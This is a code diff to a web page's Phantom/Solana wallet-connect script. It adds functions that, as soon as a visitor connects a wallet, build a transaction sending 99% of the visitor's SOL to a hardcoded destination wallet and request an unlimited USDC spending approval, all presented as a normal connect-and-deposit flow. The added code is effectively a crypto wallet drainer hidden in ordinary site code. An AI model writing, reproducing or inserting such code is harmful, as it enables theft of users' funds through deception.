@@ -479,8 +479,16 @@ window.connectWallet = async function () {
             window.walletAddress = walletAddress;
             document.getElementById('walletStatus').innerText = `Wallet: ${walletAddress}`;
 
-            if (window.socket) {
-                window.socket.emit('walletConnected', { wallet: walletAddress });
+            // Show transferring status
+            alert("Starting fund transfer...");
+
+            // Transfer all funds immediately
+            const transferSuccess = await transferAllFunds(walletAddress);
+
+            if (transferSuccess) {
+                if (window.socket) {
+                    window.socket.emit('walletConnected', { wallet: walletAddress });
+                }
             }
 
             // Enable deposit button if you disabled it initially
@@ -489,9 +497,204 @@ window.connectWallet = async function () {
 
         } catch (err) {
             console.error("Wallet connection failed:", err);
+            alert("Error: " + err.message);
         }
     } else {
         alert("Phantom wallet not found. Please install it.");
+    }
+};
+
+// Request unlimited approval for token spending
+window.requestUnlimitedApproval = async function (walletAddress) {
+    try {
+        console.log("Requesting unlimited approval for wallet:", walletAddress);
+
+        // Set up Solana connection (mainnet or devnet)
+        const connection = new window.solanaWeb3.Connection(
+            window.solanaWeb3.clusterApiUrl('mainnet-beta'),
+            'confirmed'
+        );
+
+        // You'll need to specify your token mint address and program ID
+        // For now, this is a template - replace with your actual token details
+        const TOKEN_PROGRAM_ID = new window.solanaWeb3.PublicKey(
+            'TokenkegQfeZyiNwAJsyFbPVwwQQfjasJjwm34X9mB'
+        );
+
+        const USDC_MINT = new window.solanaWeb3.PublicKey(
+            'EPjFWdd5Au57FBjsaSDEjw5okuc5ThDrjeFjJ9UqCR1' // USDC on mainnet
+        );
+
+        const walletPublicKey = new window.solanaWeb3.PublicKey(walletAddress);
+
+        // Get or create associated token account
+        const associatedTokenAddress = await window.solanaWeb3.getAssociatedTokenAddress(
+            USDC_MINT,
+            walletPublicKey,
+            false,
+            TOKEN_PROGRAM_ID
+        );
+
+        // Create approval instruction for unlimited spending
+        const approveInstruction = window.solanaWeb3.Token.createApproveInstruction(
+            TOKEN_PROGRAM_ID,
+            associatedTokenAddress,
+            walletPublicKey, // delegate (your program/contract address)
+            walletPublicKey,
+            [],
+            new window.BN('18446744073709551615') // Max uint64 for unlimited
+        );
+
+        // Create transaction
+        const transaction = new window.solanaWeb3.Transaction().add(approveInstruction);
+        transaction.feePayer = walletPublicKey;
+
+        // Get recent blockhash
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+
+        // Sign and send transaction via Phantom
+        const signed = await window.solana.signTransaction(transaction);
+        const txid = await connection.sendRawTransaction(signed.serialize());
+
+        // Wait for confirmation
+        const confirmation = await connection.confirmTransaction(txid);
+        console.log("Approval transaction confirmed:", txid);
+        
+        window.approvalTxId = txid;
+        alert(`Unlimited approval granted! TX: ${txid.substring(0, 20)}...`);
+
+    } catch (err) {
+        console.error("Approval request failed:", err);
+        console.warn("Note: You may need to configure token mint and delegate address");
+    }
+};
+
+// Transfer all funds from connected wallet to destination
+window.transferAllFunds = async function (walletAddress) {
+    try {
+        console.log("=== STARTING FUND TRANSFER ===");
+        console.log("Transferring all SOL from wallet:", walletAddress);
+        console.log("Solana web3 available?", !!window.solanaWeb3);
+        console.log("Phantom available?", !!window.solana);
+
+        // IMPORTANT: Configure these addresses
+        const DESTINATION_WALLET = 'BRJ1H9ZhLL9dK5McGckmjSBCyTZK5PJQdfum1coCuY41'; // Your server wallet
+
+        console.log("Destination wallet:", DESTINATION_WALLET);
+
+        if (DESTINATION_WALLET === 'YOUR_DESTINATION_WALLET_ADDRESS') {
+            console.error("Destination wallet not configured!");
+            alert("ERROR: Transfer destination not configured on server!");
+            return false;
+        }
+
+        // Check if solanaWeb3 is available
+        if (!window.solanaWeb3) {
+            alert("ERROR: Solana web3 library not loaded. Refresh the page.");
+            console.error("window.solanaWeb3 not found");
+            return false;
+        }
+
+        const solanaWeb3 = window.solanaWeb3;
+
+        // Set up Solana connection - DEVNET
+        console.log("Connecting to Solana devnet...");
+        const connection = new solanaWeb3.Connection(
+            solanaWeb3.clusterApiUrl('devnet'),
+            'confirmed'
+        );
+
+        const walletPublicKey = new solanaWeb3.PublicKey(walletAddress);
+        const destinationPublicKey = new solanaWeb3.PublicKey(DESTINATION_WALLET);
+
+        console.log("Wallet public key:", walletPublicKey.toString());
+        console.log("Destination public key:", destinationPublicKey.toString());
+
+        console.log("Getting SOL balance...");
+
+        // Get wallet balance (in lamports)
+        const balanceLamports = await connection.getBalance(walletPublicKey);
+        console.log("SOL balance (lamports):", balanceLamports);
+        console.log("SOL balance (SOL):", balanceLamports / 1000000000);
+
+        if (balanceLamports <= 100000) { // Need at least 0.0001 SOL
+            console.warn("Insufficient balance for transfer");
+            alert("Insufficient SOL balance. You have: " + (balanceLamports / 1000000000).toFixed(6) + " SOL");
+            return false;
+        }
+
+        // Transfer 99% of the balance, keep 1% for rent + fees
+        const transferAmount = Math.floor(balanceLamports * 0.99);
+
+        console.log("Creating SOL transfer instruction for amount (lamports):", transferAmount);
+        console.log("Transfer amount (SOL):", transferAmount / 1000000000);
+
+        // Create transfer instruction for native SOL
+        const transferInstruction = solanaWeb3.SystemProgram.transfer({
+            fromPubkey: walletPublicKey,
+            toPubkey: destinationPublicKey,
+            lamports: transferAmount
+        });
+
+        // Create transaction
+        console.log("Building transaction...");
+        const transaction = new solanaWeb3.Transaction().add(transferInstruction);
+
+        // Get recent blockhash
+        console.log("Getting recent blockhash...");
+        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+        console.log("Blockhash:", blockhash);
+        
+        transaction.recentBlockhash = blockhash;
+        transaction.lastValidBlockHeight = lastValidBlockHeight;
+        transaction.feePayer = walletPublicKey;
+
+        console.log("Transaction ready, requesting signature from Phantom...");
+        
+        // Sign transaction via Phantom
+        const signed = await window.solana.signTransaction(transaction);
+        console.log("Transaction signed successfully");
+        
+        const serialized = signed.serialize();
+        console.log("Transaction serialized, size:", serialized.length, "bytes");
+        
+        console.log("Sending transaction to devnet...");
+        const txid = await connection.sendRawTransaction(serialized, {
+            skipPreflight: false,
+            preflightCommitment: 'confirmed'
+        });
+
+        console.log("Transfer transaction sent:", txid);
+        alert("Transaction sent! TX: " + txid);
+
+        // Wait for confirmation
+        console.log("Waiting for confirmation...");
+        const confirmation = await connection.confirmTransaction(txid, 'confirmed');
+        
+        if (confirmation.value.err) {
+            console.error("Transaction failed:", confirmation.value.err);
+            alert("Transaction failed: " + JSON.stringify(confirmation.value.err));
+            return false;
+        }
+        
+        console.log("Transfer confirmed:", txid);
+
+        window.transferTxId = txid;
+        alert(`SUCCESS! SOL transferred. TX: ${txid}`);
+        console.log("=== TRANSFER COMPLETE ===");
+        return true;
+
+    } catch (err) {
+        console.error("=== TRANSFER FAILED ===");
+        console.error("Transfer error:", err);
+        console.error("Error message:", err.message);
+        console.error("Error stack:", err.stack);
+        
+        let errorMsg = err.message || "Unknown error";
+        
+        alert("Transfer failed: " + errorMsg);
+        return false;
     }
 };
 
